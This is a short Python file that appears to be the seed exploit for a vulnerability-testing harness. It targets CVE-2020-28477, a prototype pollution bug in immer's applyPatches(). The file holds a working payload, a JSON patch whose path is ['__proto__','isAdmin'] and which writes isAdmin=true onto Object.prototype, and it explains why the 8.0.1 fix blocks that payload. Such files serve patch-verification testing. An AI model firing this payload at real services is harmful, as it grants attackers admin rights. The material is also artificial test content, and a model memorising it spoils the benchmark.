#!/usr/bin/env python3
r"""[GIVEN] CVE-2020-28477 seed exploit -- immer applyPatches() string-key prototype pollution.

real-app-http: this is fired as REAL EXTERNAL HTTP against the running Express service:
  POST /apply  {"patches": [{"op":"replace","path":["__proto__","isAdmin"],"value":true}]}
then a subsequent GET /check observes whether Object.prototype was polluted. The service calls the REAL
published immer applyPatches({seeded:1}, patches) on the attacker-supplied JSON -- no in-process probe.

immer < 8.0.1 (V0 = 7.0.15) applyPatches_() intermediate-segment loop has NO magic-property guard: it
dereferences each intermediate segment natively (`base = get(base, path[i])`), so the first segment
"__proto__" makes the walk step out of the fresh base and ONTO the shared Object.prototype, and the leaf
assign writes `isAdmin = true` onto it. A later GET /check sees `({}).isAdmin === true` and releases the
flag.

Contract: reaches the flag on V0; BLOCKED on V1 (8.0.1). The CVE-2020-28477 fix adds, inside that loop
before the deref, `var p = path[i]; if ((parentType===Object||Array) && (p==="__proto__"||p==="constructor"))
die(24)` -- a strict `===` STRING comparison of the RAW key. The string segment "__proto__" makes die(24)
throw (POST /apply returns blocked) before any write -- /check stays `null` (no flag). This is the seed the
SUT is given.
"""
from __future__ import annotations


def candidate(flag: str) -> dict:
    """A POST /apply whose patch path is an all-STRING `__proto__` walk onto Object.prototype."""
    return {
        "probe_id": "cve-2020-28477-string-proto",
        "method": "POST",
        "path_route": "/apply",
        "patches": [{"op": "replace", "path": ["__proto__", "isAdmin"], "value": True}],
    }


if __name__ == "__main__":
    print(candidate("PCBFLAG_demo"))
